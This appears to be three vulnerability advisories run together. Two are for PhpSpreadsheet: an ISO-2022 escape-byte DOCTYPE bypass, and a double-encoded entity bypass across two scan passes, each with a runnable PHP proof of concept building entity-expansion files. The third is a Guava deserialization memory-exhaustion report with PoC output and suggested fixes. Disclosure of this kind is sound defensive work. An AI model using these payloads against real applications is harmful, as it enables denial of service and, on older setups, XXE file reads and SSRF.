### Summary
PhpSpreadsheet's `XmlScanner::scan()` uses a regex pattern that only accounts for NULL byte (0x00) interleaving when detecting `<!DOCTYPE`. ISO-2022 escape sequences (0x1B bytes) inserted between the characters of the pattern break the regex match entirely, allowing DOCTYPE declarations with entity definitions to pass through undetected. This enables Denial of Service via quadratic entity expansion on **all PHP versions**, and XXE/SSRF on PHP < 8.0 or when `LIBXML_NOENT` is used. Any application using PhpSpreadsheet to process user-uploaded XLSX files is affected.

### Details
The vulnerability exists in `src/PhpSpreadsheet/Reader/Security/XmlScanner.php`, method `scan()`, lines 87–100.

The scanner builds a regex pattern `/\0*<\0*!\0*D\0*O\0*C\0*T\0*Y\0*P\0*E\0*/` that only handles NULL byte interleaving. ISO-2022 escape sequences (e.g., `0x1B 0x28 0x42` for ISO-2022-JP) inserted between each character of `<!DOCTYPE` break the regex because it only expects optional `\0` between characters.

The XLSX reader extracts XML parts from the ZIP archive and passes each through `XmlScanner::scan()` before `simplexml_load_string()`. The XML parser strips the ESC bytes during charset normalization, producing a valid `<!DOCTYPE` declaration that the scanner never detected.

Seven ISO-2022 encoding variants bypass the scanner:
- ISO-2022-JP (`ESC ( B`)
- ISO-2022-JP-2 (`ESC $ B`)
- ISO-2022-KR (`ESC $ ) C`)
- ISO-2022-CN (`ESC $ ) A`)
- ISO-2022-CN-EXT (`ESC $ ) G`)
- ISO-2022-JP-2004 (`ESC $ ( Q`)
- ISO-2022-JP-MS (`ESC & @ ESC $ B`)

Internal entity expansion (quadratic blowup) is **not blocked** by libxml2 2.9+ defaults, making this directly exploitable for DoS on all modern PHP versions.

### PoC

Save the following as `poc_iso2022.php` in a directory with PhpSpreadsheet installed via Composer:

```php
<?php
require 'vendor/autoload.php';

// ESC ( B = ISO-2022-JP escape sequence (switch to ASCII)
$esc = "\x1b\x28\x42";

// Build <!DOCTYPE with ESC bytes between each character
$doctype = "<".$esc."!".$esc."D".$esc."O".$esc."C".$esc."T".$esc."Y".$esc."P".$esc."E";

// Internal entity for DoS (works on ALL PHP versions)
$entity_value = str_repeat('A', 100000);
$refs = str_repeat('&big;', 200);

$shared_strings = '<?xml version="1.0" encoding="UTF-8"?>' . "\n"
    . $doctype . ' sst [' . "\n"
    . '  <!ENTITY big "' . $entity_value . '">' . "\n"
    . ']>' . "\n"
    . '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">'
    . '<si><t>' . $refs . '</t></si></sst>';

// Build minimal XLSX
$xlsx = new ZipArchive();
$xlsx->open('poc.xlsx', ZipArchive::CREATE | ZipArchive::OVERWRITE);
$xlsx->addFromString('[Content_Types].xml',
    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    .'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    .'<Default Extension="xml" ContentType="application/xml"/>'
    .'<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    .'<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    .'<Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>'
    .'</Types>');
$xlsx->addFromString('_rels/.rels',
    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    .'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
    .'</Relationships>');
$xlsx->addFromString('xl/workbook.xml',
    '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    .'<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>');
$xlsx->addFromString('xl/_rels/workbook.xml.rels',
    '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    .'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
    .'<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>'
    .'</Relationships>');
$xlsx->addFromString('xl/worksheets/sheet1.xml',
    '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
    .'<sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row></sheetData></worksheet>');
$xlsx->addFromString('xl/sharedStrings.xml', $shared_strings);
$xlsx->close();

echo "XLSX size: " . filesize('poc.xlsx') . " bytes\n";

// Load with PhpSpreadsheet
$mem_before = memory_get_usage(true);
$reader = new \PhpOffice\PhpSpreadsheet\Reader\Xlsx();
$reader->setReadDataOnly(true);
$spreadsheet = $reader->load('poc.xlsx');
$peak = memory_get_peak_usage(true);

echo "Peak memory: " . round($peak / 1024 / 1024, 1) . " MB\n";

$val = $spreadsheet->getActiveSheet()->getCell('A1')->getValue();
echo "Cell A1 length: " . strlen($val) . " bytes\n";
echo "Entity expansion: " . (strlen($val) > 10000 ? "CONFIRMED" : "not detected") . "\n";
```

Run: `php -d memory_limit=512M poc_iso2022.php`

**Expected result:** The scanner does not detect the DOCTYPE. The XLSX loads successfully. Internal entities expand, consuming ~45 MB of memory from a ~2 KB file.

**Tested on:** PhpSpreadsheet 5.9.0, PHP 8.5.3, libxml2 2.9.13.

### Impact

| Attack | PHP < 8.0 / libxml2 < 2.9 | PHP 8.x / libxml2 2.9+ |
|--------|---------------------------|------------------------|
| Denial of Service (quadratic blowup) | **Exploitable** | **Exploitable** |
| Local file read via SYSTEM entity | **Exploitable** | Blocked by default |
| SSRF via SYSTEM entity | **Exploitable** | Blocked by default |
| File read when LIBXML_NOENT is used | **Exploitable** | **Exploitable** |

Any application that accepts user-uploaded XLSX files and processes them with PhpSpreadsheet is vulnerable. The DoS impact is the most severe because it requires no special PHP configuration and works on all supported PHP versions. A 2 KB XLSX causes 45 MB peak memory usage (22,000:1 amplification ratio). Multiple concurrent uploads can exhaust server memory.

### Summary
The SpreadsheetML XML reader (`Reader\Xml`) scans file content **twice** through `XmlScanner::scan()`, and each scan runs an `unentity()` callback that calls `html_entity_decode()` **after** the pattern check. By double-encoding the `<` character as `&#38;#60;`, the first scan decodes `&#38;` to `&` (forming `&#60;`), and the second scan decodes `&#60;` to `<` (forming `<!DOCTYPE`). Neither scan's pattern check detects the `<!DOCTYPE` string because the callback runs after each check. This enables Denial of Service via entity expansion on **all PHP versions**, and XXE/SSRF on PHP < 8.0 or when `LIBXML_NOENT` is used.

### Details

The vulnerability involves an interaction between three code locations:

**1. `XmlScanner::scan()`** (XmlScanner.php, lines 87–108) — checks the pattern *before* the callback:

```php
public function scan($xml): string
{
    $pattern = '/\0*<\0*!\0*D\0*O\0*...\0*/';

    if (preg_match($pattern, $xml)) {       // CHECK 1 (raw)
        throw new Exception('Detected use of ENTITY...');
    }
    $xml = $this->toUtf8($xml);
    if (preg_match($pattern, $xml)) {       // CHECK 2 (UTF-8)
        throw new Exception('Detected use of ENTITY...');
    }
    if ($this->callback !== null) {
        $xml = call_user_func($this->callback, $xml); // DECODE (after checks!)
    }
    return $xml;  // <!DOCTYPE now present, never checked
}
```

**2. `Xml::canRead()`** (Xml.php, lines 79–117) — scans and stores the result:

```php
$data = file_get_contents($filename);
$data = $this->getSecurityScannerOrThrow()->scan($data); // 1st scan
// ...
$this->fileContents = $data; // stores partially-decoded content
```

**3. `Xml::trySimpleXMLLoadStringPrivate()`** (Xml.php, lines 120–150) — re-scans the stored content:

```php
$data = $this->fileContents; // already partially decoded
$xml = simplexml_load_string(
    $this->getSecurityScannerOrThrow()->scan($data) // 2nd scan finishes decoding
);
```

The double-scan decode chain:

```
Raw file:       &#38;#60;!DOCTYPE
                         |
1st scan():     pattern check → no match (no "<" character)
                callback → html_entity_decode(&#38;) = &
                         |
Stored:         &#60;!DOCTYPE
                         |
2nd scan():     pattern check → no match (no "<" character)
                callback → html_entity_decode(&#60;) = <
                         |
Parser sees:    <!DOCTYPE ← never detected by either scan
```

The `unentity()` callback (Xml.php, lines 54–61) protects five named entities (`&amp; &lt; &gt; &quot; &apos;`) via Unicode placeholders, but numeric entities (`&#38; &#60; &#x26; &#x3C;`) are not protected and are decoded by `html_entity_decode()`.

### PoC

Save the following as `poc_toctou.php` in a directory with PhpSpreadsheet installed via Composer:

```php
<?php
require 'vendor/autoload.php';

// Double-encoded: &#38;#60; survives two scan() passes
// 1st scan callback: &#38; → & (forms &#60;)
// 2nd scan callback: &#60; → < (forms <!DOCTYPE)
$entity_value = str_repeat('A', 100000);
$refs = str_repeat('&big;', 200);

$xml = '<?xml version="1.0"?>' . "\n"
    . '<?mso-application progid="Excel.Sheet"?>' . "\n"
    . '&#38;#60;!DOCTYPE Workbook [' . "\n"
    . '  &#38;#60;!ENTITY big "' . $entity_value . '">' . "\n"
    . ']>' . "\n"
    . '<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"' . "\n"
    . '  xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">' . "\n"
    . '  <Worksheet ss:Name="Sheet1">' . "\n"
    . '    <Table><Row><Cell><Data ss:Type="String">' . $refs . '</Data></Cell></Row></Table>' . "\n"
    . '  </Worksheet>' . "\n"
    . '</Workbook>';

file_put_contents('poc.xml', $xml);
echo "File size: " . filesize('poc.xml') . " bytes\n";

$mem_before = memory_get_usage(true);
$reader = new \PhpOffice\PhpSpreadsheet\Reader\Xml();
echo "canRead: " . ($reader->canRead('poc.xml') ? 'true' : 'false') . "\n";
$spreadsheet = $reader->load('poc.xml');
$peak = memory_get_peak_usage(true);

echo "Peak memory: " . round($peak / 1024 / 1024, 1) . " MB\n";

$val = $spreadsheet->getActiveSheet()->getCell('A1')->getValue();
echo "Cell A1 length: " . strlen($val) . " bytes\n";
echo "Entity expansion: " . (strlen($val) > 10000 ? "CONFIRMED" : "not detected") . "\n";
```

Run: `php -d memory_limit=512M poc_toctou.php`

**Expected result:** The file loads successfully, bypassing both scan passes. Internal entities expand, consuming ~45 MB of memory. Cell A1 contains 32,767 bytes (PhpSpreadsheet's max cell length, confirming entity expansion).

**Hex variant:** Replace `&#38;#60;` with `&#38;#x3C;` — both are decoded by `html_entity_decode()`.

**Tested on:** PhpSpreadsheet 5.9.0, PHP 8.5.3, libxml2 2.9.13.

### Impact

| Attack | PHP < 8.0 / libxml2 < 2.9 | PHP 8.x / libxml2 2.9+ |
|--------|---------------------------|------------------------|
| Denial of Service (quadratic blowup) | **Exploitable** | **Exploitable** |
| Local file read via SYSTEM entity | **Exploitable** | Blocked by default |
| SSRF via SYSTEM entity | **Exploitable** | Blocked by default |
| File read when LIBXML_NOENT is used | **Exploitable** | **Exploitable** |

Any application that accepts user-uploaded SpreadsheetML XML files (recognized by the `<?mso-application progid="Excel.Sheet"?>` processing instruction) and processes them with PhpSpreadsheet's `Xml` reader is vulnerable.

# CompactHashMap/CompactHashSet/MapMakerInternalMap native deserialization triggers uncontrolled memory allocation

## Summary

`CompactHashMap`, `CompactHashSet`, and `MapMakerInternalMap` implement `readObject(ObjectInputStream)` by reading an attacker-controlled `elementCount` or `initialCapacity` from the stream. On the very first insertion during or after deserialization (for the `CompactHash*` collections, inside `allocArrays()`) or immediately during deserialization (for `MapMakerInternalMap`), the implementation eagerly allocates arrays sized to that full, unvalidated value (up to `CompactHashing.MAX_SIZE` = 2^30-1, ~1.07 billion, for example) before the rest of the stream's actual content has been consumed. A 72-byte malicious serialized stream containing a single tiny element can force a multi-gigabyte allocation and crash a JVM with `OutOfMemoryError`, dynamically confirmed against the current release.

## Details

`CompactHashMap.readObject()` (`guava/src/com/google/common/collect/CompactHashMap.java`):

```java
private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException {
  stream.defaultReadObject();
  int elementCount = stream.readInt();
  if (elementCount < 0) {
    throw new InvalidObjectException("Invalid size: " + elementCount);
  }
  init(elementCount);
  for (int i = 0; i < elementCount; i++) {
    K key = (K) stream.readObject();
    V value = (V) stream.readObject();
    put(key, value);
  }
}
```

`elementCount` is only checked for being non-negative; there is no upper bound and no relationship enforced between the declared count and how much data actually follows in the stream. `init(elementCount)` (line 251) just stores the value (clamped to `[1, CompactHashing.MAX_SIZE]`, i.e. up to 2^30-1):

```java
void init(int expectedSize) {
  Preconditions.checkArgument(expectedSize >= 0, "Expected size must be >= 0");
  this.metadata = Ints.constrainToRange(expectedSize, 1, CompactHashing.MAX_SIZE);
}
```

The real allocation is deferred to `allocArrays()`, which fires lazily on the *first* `put()` call — i.e. after only one key/value pair has actually been read off the wire:

```java
int allocArrays() {
  ...
  int expectedSize = metadata;
  int buckets = CompactHashing.tableSize(expectedSize);
  this.table = CompactHashing.createTable(buckets);
  setHashTableMask(buckets - 1);
  this.entries = new int[expectedSize];
  this.keys = new Object[expectedSize];
  this.values = new Object[expectedSize];
  return expectedSize;
}
```

With `expectedSize` near `CompactHashing.MAX_SIZE` (2^30-1), this single call allocates a hash `table` plus three `expectedSize`-length arrays — multiple gigabytes — triggered by a stream that has, at that point, only supplied one small real element. `CompactHashSet.readObject()`/`allocArrays()` have the identical shape. `CompactLinkedHashMap`/`CompactLinkedHashSet` extend these classes and inherit the same unguarded path.

The problem with `MapMakerInternalMap` is similar, with [a size read from the serialized data and stored in a `MapMaker` instance](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2848-L2851) for [later user during deserialization](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2897), when [the `MapMaker` is passed back to `MapMakerInternalMap`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMaker.java#L287) and [segments are allocated](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L173-L200) by [calling `newSegment`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1143), whose implementations ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L443)) create `Segment` instances ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2019)) that [allocate arrays of the requested capacity](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1234) through [the `newTable`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1262) helper.

This is the same amplification shape as the already-fixed **CVE-2018-10237** (`AtomicDoubleArray`/`CompoundOrdering`: attacker declares a large size, library eagerly allocates before validating against actual stream content). That fix rewrote `AtomicDoubleArray.readObject()` to grow an `ImmutableLongArray.Builder` incrementally per element actually read, rather than pre-allocating from the declared size — Guava's own `HashBiMap.readObject()` documents the same defensive principle explicitly in a comment: `init(16); // resist hostile attempts to allocate gratuitous heap`. `CompactHashMap`/`CompactHashSet` do not follow either of these two patterns already present elsewhere in the same codebase.

**Reachability**: All classes are top-level, `implements ... Serializable`, and require no special classpath setup beyond Guava being present (near-ubiquitous on JVM backends). A native Java deserialization attacker names the class directly in a hand-crafted stream — no particular Guava factory method needs to have been used by the victim application, exactly as with the precedent CVE.

## PoC

Full source and run instructions in the attached `poc-guava-compacthash-dos.zip` (Maven project, `guava:33.7.1-jre` — the current latest release — as the only dependency). The PoC:

1. Uses reflection only to legitimately obtain a `CompactHashSet` instance (it is package-private; a real attacker does not need this step, since they craft the serialized bytes directly rather than calling Guava's own serialization code).
2. Serializes one set with 1 element and one with 2 elements, diffs the two byte streams to locate the exact offset of the `elementCount` field (byte-precise, not guessed).
3. Patches that one 4-byte field in the 1-element stream from `1` to `0x3FFFFFFF` (`CompactHashing.MAX_SIZE`), leaving the rest of the 72-byte stream (one real `"A"` element) untouched.
4. Feeds the resulting 72-byte malicious stream into a plain `new ObjectInputStream(...).readObject()` call against the real, unmodified `guava-33.7.1-jre.jar`.

Actual run output:

```
### -Xmx8g (generous heap) ###
Located size field at offset 63, value=1 (expected 1)
Malicious stream size: 72 bytes
Declared elementCount: 1073741823 (~1.07 billion)
Real payload: 1 tiny string element ("A")
=== RESULT ===
Exception: java.lang.OutOfMemoryError: Java heap space
Time to allocate+fail: 4013 ms
Heap used before: 3 MB
Heap used after (at failure point): 4103 MB
JVM max heap (-Xmx): 8192 MB

### -Xmx128m (ordinary service-sized heap) ###
Located size field at offset 63, value=1 (expected 1)
Malicious stream size: 72 bytes
Declared elementCount: 1073741823 (~1.07 billion)
Real payload: 1 tiny string element ("A")
=== RESULT ===
Exception: java.lang.OutOfMemoryError: Java heap space
Time to allocate+fail: 24 ms
Heap used before: 4 MB
Heap used after (at failure point): 2 MB
JVM max heap (-Xmx): 128 MB
```

A 72-byte input forces ~4.1 GB of real allocation before failing on an 8 GB heap, and crashes a 128 MB heap in 24 ms — over 50,000x amplification between input size and forced allocation.

To reproduce: `mvn -q compile dependency:build-classpath -Dmdep.outputFile=cp.txt && java -Xmx128m -cp "target/classes:$(cat cp.txt)" poc.Poc`

## Impact

Uncontrolled resource consumption (CWE-770 / CWE-400) via native Java deserialization: any application that runs `ObjectInputStream.readObject()` on data reachable by an attacker, and has Guava on its classpath (true for a large fraction of the JVM ecosystem), can be crashed with a single ~72-byte payload, regardless of what type the application itself expected to deserialize.

## Severity

CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H` — identical vector to CVE-2018-10237, the precedent this is a sibling of. Recomputed with the full formula: exploitability = 8.22×0.85×0.44×0.85×0.85 = 2.221; ISS = 1-(1×1×0.44) = 0.56; impact = 6.42×0.56 = 3.595; base = roundup(5.816) = **5.9 (Medium)**.

## Affected

`com.google.guava:guava`, all editions (`-jre`/`-android`) — confirmed on the current latest release, 33.7.1-jre. `CompactHashMap`/`CompactHashSet`/`CompactLinkedHashMap`/`CompactLinkedHashSet` have had this same `readObject`/`allocArrays` shape for a long time (probably since they were added in Guava 23.6), and similarly for `MapMakerInternalMap` (which was introduced in Guava 4.0); not tested against older individual releases.

## Suggested fix

Apply the same defense already used elsewhere in this codebase: either clamp the initial `init()` capacity to a small constant regardless of the declared `elementCount` (as `HashBiMap.readObject()` already does — `init(16); // resist hostile attempts to allocate gratuitous heap`) and grow incrementally as elements are actually read, or grow the backing arrays incrementally per iteration of the deserialization loop (as the fixed `AtomicDoubleArray.readObject()` does via `ImmutableLongArray.Builder`) instead of eagerly sizing to the full attacker-declared count on first insert.
